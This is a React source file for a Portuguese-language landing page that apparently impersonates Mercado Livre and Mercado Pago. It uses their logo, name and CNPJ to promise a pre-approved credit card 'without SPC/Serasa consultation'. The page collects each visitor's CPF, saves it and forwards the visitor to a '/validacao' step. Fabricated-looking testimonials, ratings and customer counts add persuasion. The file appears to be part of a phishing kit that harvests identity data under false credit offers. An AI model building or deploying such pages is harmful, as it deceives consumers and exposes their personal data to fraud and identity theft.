import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useEffect, useRef, useState } from "react";
import mlLogo from "@/assets/mercado-livre-logo.png";

export const Route = createFileRoute("/")({
  head: () => ({
    meta: [
      { title: "Cartão de Crédito Pré-aprovado - Limite de até R$10.000" },
      { name: "description", content: "Solicite seu cartão de crédito pré-aprovado com limite de até R$10.000. Sem consulta ao SPC/Serasa, aprovação em 5 minutos." },
      { property: "og:title", content: "Cartão de Crédito Pré-aprovado" },
      { property: "og:description", content: "Limite de até R$10.000. Sem burocracia." },
    ],
    links: [
      { rel: "stylesheet", href: "https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" },
    ],
  }),
  component: Index,
});

import heroImg from "@/assets/hero-mercado-livre.png";
import cartaoEntregaImg from "@/assets/cartao-entrega.png";
import step1Img from "@/assets/step-1.png";
import step2Img from "@/assets/step-2.png";
import step3Img from "@/assets/step-3.png";
const steps = [
  { img: step1Img, text: "Preencha seu CPF para consultar seu limite de cartão pré-aprovado" },
  { img: step2Img, text: "Escolha seu modelo de cartão e forma de envio" },
  { img: step3Img, text: "Receba seu cartão no conforto de casa e comece a usar" },
];

function formatCPF(v: string) {
  const d = v.replace(/\D/g, "").slice(0, 11);
  return d
    .replace(/(\d{3})(\d)/, "$1.$2")
    .replace(/(\d{3})\.(\d{3})(\d)/, "$1.$2.$3")
    .replace(/(\d{3})\.(\d{3})\.(\d{3})(\d)/, "$1.$2.$3-$4");
}

function Index() {
  const [idx, setIdx] = useState(0);
  const [activeStep, setActiveStep] = useState(-1);
  const [cpf, setCpf] = useState("");
  const [accepted, setAccepted] = useState(false);
  const timelineRef = useRef<HTMLDivElement>(null);
  const navigate = useNavigate();

  useEffect(() => {
    const t = setInterval(() => setIdx((i) => (i + 1) % 3), 5000);
    return () => clearInterval(t);
  }, []);

  useEffect(() => {
    const el = timelineRef.current;
    if (!el) return;
    const observer = new IntersectionObserver(
      (entries) => {
        if (entries[0].isIntersecting) {
          [0, 1, 2].forEach((i) => {
            setTimeout(() => setActiveStep(i), i * 3000);
          });
          observer.disconnect();
        }
      },
      { threshold: 0.3 }
    );
    observer.observe(el);
    return () => observer.disconnect();
  }, []);

  const handleCTA = () => {
    const digits = cpf.replace(/\D/g, "");
    if (digits.length === 11 && typeof window !== "undefined") {
      sessionStorage.setItem("cpfPreenchido", digits);
    }
    navigate({ to: "/validacao" });
  };


  return (
    <div className="min-h-screen bg-[#FFE600]">
      <div className="max-w-md mx-auto min-h-screen bg-[#FFE600] relative">
        {/* Header */}
        <div className="flex items-center px-4 py-3 bg-[#FFE600] shadow-sm">
          <div className="flex-1 flex justify-center items-center">
            <img src={mlLogo} alt="Mercado Livre" className="h-9 object-contain" />
          </div>
        </div>

        {/* Hero + CPF inline (estrutura MP) */}
        <div className="relative">
          <img src={heroImg} alt="Cartão Mercado Pago Pré-aprovado" className="w-full h-auto object-contain block" />
        </div>

        <div className="px-4 -mt-6 relative z-10">
          <div className="bg-white rounded-2xl shadow-xl p-5">
            <h2 className="text-lg font-bold text-gray-900 mb-4">
              Peça seu cartão de crédito
            </h2>
            <label className="block text-xs font-semibold text-gray-700 mb-1.5" htmlFor="cpf-hero">
              CPF
            </label>
            <input
              id="cpf-hero"
              type="tel"
              inputMode="numeric"
              placeholder="000.000.000-00"
              value={cpf}
              onChange={(e) => setCpf(formatCPF(e.target.value))}
              className="w-full border border-gray-300 rounded-md px-3 py-3 text-base focus:outline-none focus:ring-2 focus:ring-[#3483FA] focus:border-transparent"
            />
            <label className="flex items-start gap-2 mt-3 cursor-pointer">
              <input
                type="checkbox"
                checked={accepted}
                onChange={(e) => setAccepted(e.target.checked)}
                className="mt-0.5 w-4 h-4 accent-[#3483FA] shrink-0"
              />
              <span className="text-[11px] text-gray-600 leading-snug">
                Li e entendi a <a href="#" className="text-[#3483FA] underline">Declaração de Privacidade</a> e autorizo o tratamento dos meus dados, inclusive para consulta ao SCR.
              </span>
            </label>
            <button
              onClick={handleCTA}
              disabled={!accepted || cpf.replace(/\D/g, "").length !== 11}
              className="w-full bg-[#3483FA] hover:bg-[#2968C8] disabled:bg-gray-300 disabled:cursor-not-allowed text-white text-base font-semibold py-3.5 rounded-md mt-4 transition-all"
            >
              Continuar
            </button>
            <div className="flex items-center justify-center mt-3 text-gray-500">
              <i className="fas fa-lock mr-1.5 text-xs" />
              <span className="text-[11px]">Seus dados estão protegidos e seguros</span>
            </div>
          </div>
        </div>

        {/* Bloco "O cartão te dá..." estilo MP (imagem + lista de checks) */}
        <div className="px-4 mt-8">
          <div className="bg-white rounded-2xl shadow-md p-5">
            <div className="flex justify-center mb-4">
              <img
                src={cartaoEntregaImg}
                alt="Cartão Mercado Livre"
                className="w-44 h-auto object-contain drop-shadow-xl"
              />
            </div>
            <h2 className="text-xl font-extrabold text-gray-900 text-center leading-tight mb-5">
              O cartão que te dá <span className="text-[#3483FA]">benefícios reais</span> em todas as compras
            </h2>
            <ul className="space-y-3">
              {[
                { title: "Sem anuidade", desc: "Zero taxa anual, pra sempre." },
                { title: "Parcele em até 12x", desc: "Sem juros em produtos selecionados no Mercado Livre." },
                { title: "Cashback nas compras", desc: "Receba de volta direto na sua conta." },
                { title: "Acompanhe tudo pelo app", desc: "Gastos, limites e cartões em um só lugar." },
              ].map((b) => (
                <li key={b.title} className="flex items-start gap-3">
                  <span className="w-6 h-6 rounded-full bg-[#3483FA] flex items-center justify-center shrink-0 mt-0.5">
                    <i className="fa-solid fa-check text-white text-[11px]" />
                  </span>
                  <div>
                    <p className="text-sm font-bold text-gray-900 leading-tight">{b.title}</p>
                    <p className="text-xs text-gray-600 mt-0.5">{b.desc}</p>
                  </div>
                </li>
              ))}
            </ul>
          </div>
        </div>

        {/* É muito fácil pedir — Timeline 3 passos */}
        <div className="px-4 mt-6">
          <div className="bg-white rounded-2xl shadow-md p-6">
            <h2 className="text-xl font-extrabold text-gray-900 mb-6 text-center leading-tight">
              É muito fácil pedir seu cartão
            </h2>

            <div ref={timelineRef} className="relative pl-14">
              {[
                { title: "Peça seu cartão de crédito", text: "Você pede em poucas etapas e nós cuidamos do resto." },
                { title: "Vamos analisar seu pedido", text: "Queremos te conhecer analisando seu histórico com relação a crédito." },
                { title: "Receba seu cartão", text: "Aprovado, seu cartão chega no conforto da sua casa." },
              ].map((item, i, arr) => {
                const isActive = activeStep >= i;
                return (
                  <div key={i} className="relative pb-8 last:pb-0">
                    {i < arr.length - 1 && (
                      <span className="absolute left-[-32px] top-10 bottom-0 w-0.5 bg-gray-200 overflow-hidden">
                        <span
                          className="block w-full bg-[#3483FA] transition-all duration-[3000ms] ease-linear"
                          style={{ height: activeStep > i ? "100%" : "0%" }}
                        />
                      </span>
                    )}
                    <div
                      className={`absolute left-[-46px] top-0 w-10 h-10 rounded-full border-2 flex items-center justify-center font-bold transition-all duration-500 ${
                        isActive
                          ? "border-[#3483FA] bg-[#3483FA] text-white scale-110 shadow-lg shadow-[#3483FA]/40"
                          : "border-gray-300 bg-white text-gray-400"
                      }`}
                    >
                      {i + 1}
                    </div>
                    <h3 className={`font-bold text-base transition-colors duration-500 ${isActive ? "text-gray-900" : "text-gray-400"}`}>{item.title}</h3>
                    <p className={`text-sm mt-1 transition-colors duration-500 ${isActive ? "text-gray-600" : "text-gray-400"}`}>{item.text}</p>
                  </div>
                );
              })}
            </div>

            <button
              onClick={handleCTA}
              className="w-full bg-[#3483FA] hover:bg-[#2968C8] text-white text-base font-semibold py-3.5 rounded-md mt-4 transition-all"
            >
              Pedir meu cartão
            </button>
          </div>
        </div>



        {/* Bloco entrega do cartão */}
        <div className="px-4 mt-6">
          <div className="relative bg-white rounded-2xl shadow-md overflow-hidden">
            <div className="relative px-6 pt-6 pb-2 text-center">
              <span className="inline-flex items-center gap-1.5 bg-[#FFE600] text-gray-900 text-[10px] font-bold uppercase tracking-wider px-3 py-1 rounded-full shadow-sm">

                <i className="fas fa-truck-fast" /> Entrega rápida e segura
              </span>
              <h3 className="mt-3 text-xl font-bold text-gray-900 leading-tight">
                Receba seu cartão em casa
              </h3>
              <p className="text-sm text-gray-600 mt-1.5 max-w-xs mx-auto">
                Embalagem exclusiva, rastreamento em tempo real e entrega em todo o Brasil.
              </p>
            </div>

            <div className="relative flex justify-center px-4 pb-4">
              <img
                src={cartaoEntregaImg}
                alt="Cartão Mercado Livre e envelope de entrega"
                className="w-full max-w-[280px] object-contain drop-shadow-xl"
              />
            </div>

            <div className="relative grid grid-cols-3 gap-2 px-4 pb-5 text-center">
              <div className="bg-gray-50 rounded-lg py-2.5 px-1">
                <i className="fas fa-box-open text-gray-900 text-base" />
                <div className="text-[10px] font-semibold text-gray-700 mt-1 leading-tight">Embalagem exclusiva</div>
              </div>
              <div className="bg-gray-50 rounded-lg py-2.5 px-1">
                <i className="fas fa-location-dot text-gray-900 text-base" />
                <div className="text-[10px] font-semibold text-gray-700 mt-1 leading-tight">Rastreio em tempo real</div>
              </div>
              <div className="bg-gray-50 rounded-lg py-2.5 px-1">
                <i className="fas fa-shield-halved text-gray-900 text-base" />
                <div className="text-[10px] font-semibold text-gray-700 mt-1 leading-tight">Entrega segura</div>
              </div>
            </div>
          </div>
        </div>


        {/* Estatísticas */}
        <div className="px-4 mt-6">
          <div className="bg-gradient-to-br from-[#3483FA] to-[#1c5fc7] rounded-2xl shadow-xl p-5 flex justify-between text-center relative overflow-hidden">
            <div className="absolute -top-6 -right-6 w-24 h-24 bg-white/10 rounded-full" />
            <div className="absolute -bottom-8 -left-8 w-28 h-28 bg-white/5 rounded-full" />
            <div className="relative flex-1">
              <div className="flex items-center justify-center gap-1 text-yellow-300 mb-1">
                <i className="fa-solid fa-users text-sm" />
              </div>
              <p className="text-2xl font-extrabold text-white leading-none">+500mil</p>
              <p className="text-[11px] text-white/80 mt-1 font-medium uppercase tracking-wide">Clientes</p>
            </div>
            <div className="w-px bg-white/20 mx-2" />
            <div className="relative flex-1">
              <div className="flex items-center justify-center gap-1 text-yellow-300 mb-1">
                <i className="fa-solid fa-star text-sm" />
              </div>
              <p className="text-2xl font-extrabold text-white leading-none">4.8/5</p>
              <p className="text-[11px] text-white/80 mt-1 font-medium uppercase tracking-wide">Avaliação</p>
            </div>
            <div className="w-px bg-white/20 mx-2" />
            <div className="relative flex-1">
              <div className="flex items-center justify-center gap-1 text-yellow-300 mb-1">
                <i className="fa-solid fa-bolt text-sm" />
              </div>
              <p className="text-2xl font-extrabold text-white leading-none">5 min</p>
              <p className="text-[11px] text-white/80 mt-1 font-medium uppercase tracking-wide">Aprovação</p>
            </div>
          </div>
        </div>


        {/* Depoimentos */}
        <div className="px-4 mt-6">
          <div className="bg-white rounded-2xl shadow-md p-5">
            <h2 className="text-lg font-bold text-gray-900 text-center mb-1">O que dizem nossos clientes</h2>
            <div className="flex items-center justify-center gap-1 text-yellow-400 mb-4">
              {[...Array(5)].map((_, i) => <i key={i} className="fa-solid fa-star text-xs" />)}
              <span className="text-xs text-gray-600 ml-1 font-medium">4.8 · +12 mil avaliações</span>
            </div>
            <div className="space-y-3">
              {[
                { name: "Mariana S.", city: "São Paulo, SP", text: "Pedi e em 3 dias o cartão chegou em casa. Super fácil!" },
                { name: "Carlos R.", city: "Rio de Janeiro, RJ", text: "Aprovação foi rápida mesmo, sem burocracia nenhuma." },
                { name: "Juliana P.", city: "Belo Horizonte, MG", text: "Adorei o cashback nas compras do Mercado Livre." },
              ].map((d) => (
                <div key={d.name} className="border border-gray-100 rounded-xl p-3">
                  <div className="flex items-center gap-2 mb-1.5">
                    <div className="w-8 h-8 rounded-full bg-[#3483FA] text-white flex items-center justify-center font-bold text-xs">
                      {d.name.charAt(0)}
                    </div>
                    <div>
                      <p className="text-sm font-bold text-gray-900 leading-tight">{d.name}</p>
                      <p className="text-[10px] text-gray-500">{d.city}</p>
                    </div>
                    <div className="ml-auto flex gap-0.5 text-yellow-400">
                      {[...Array(5)].map((_, i) => <i key={i} className="fa-solid fa-star text-[10px]" />)}
                    </div>
                  </div>
                  <p className="text-xs text-gray-700 leading-relaxed">"{d.text}"</p>
                </div>
              ))}
            </div>
          </div>
        </div>

        {/* FAQ */}
        <div className="px-4 mt-6">
          <div className="bg-white rounded-2xl shadow-md p-5">
            <h2 className="text-lg font-bold text-gray-900 text-center mb-4">Perguntas frequentes</h2>
            <div className="space-y-2">
              {[
                { q: "O cartão tem anuidade?", a: "Não. O cartão Mercado Livre é 100% livre de anuidade." },
                { q: "Em quanto tempo recebo o cartão?", a: "Após a aprovação, o cartão chega em até 7 dias úteis no seu endereço." },
                { q: "Preciso ter conta no Mercado Livre?", a: "Sim, é necessário ter cadastro ativo no Mercado Livre ou Mercado Pago." },
                { q: "Como faço para cancelar?", a: "O cancelamento pode ser feito a qualquer momento pelo app, sem taxas." },
              ].map((item, i) => (
                <details key={i} className="group border border-gray-100 rounded-xl px-3 py-2.5">
                  <summary className="flex items-center justify-between cursor-pointer text-sm font-semibold text-gray-900 list-none">
                    <span>{item.q}</span>
                    <i className="fa-solid fa-chevron-down text-xs text-gray-500 group-open:rotate-180 transition-transform" />
                  </summary>
                  <p className="text-xs text-gray-600 mt-2 leading-relaxed">{item.a}</p>
                </details>
              ))}
            </div>
          </div>
        </div>

        {/* Footer */}
        <div className="px-4 pt-6 pb-28">
          <div className="text-center text-xs text-gray-500">
            <p>© 2025 Mercado Instituição de Pagamento Ltda.</p>
            <p>CNPJ: 10.573.521/0001-91</p>
          </div>
        </div>
      </div>

      {/* CTA fixo no rodapé */}
      <div className="fixed bottom-0 left-0 right-0 z-40 bg-white border-t border-gray-200 shadow-[0_-4px_12px_rgba(0,0,0,0.08)]">
        <div className="max-w-md mx-auto px-4 py-3">
          <button
            onClick={handleCTA}
            className="w-full bg-[#3483FA] hover:bg-[#2968C8] text-white text-base font-semibold py-3.5 rounded-md transition-all"
          >
            Solicitar meu cartão agora
          </button>
        </div>
      </div>

    </div>
  );
}
